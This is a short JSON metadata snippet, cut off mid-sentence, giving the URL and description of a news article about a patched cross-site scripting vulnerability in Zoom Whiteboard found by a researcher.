     "webpage_description": "A researcher found a severe cross-site scripting (XSS) vulnerability in the Zoom Whiteboard app. Zoom patched the flaw in time, preventing any malicious exploitation. Zoom Whiteboard Vulnerability Sharing the details in a blog post, Eugene Lim, aka",
     "webpage_url": "https://latesthackingnews.com/2023/01/01/serious-xss-vulnerability-found-in-zoom-whiteboard/"
 }
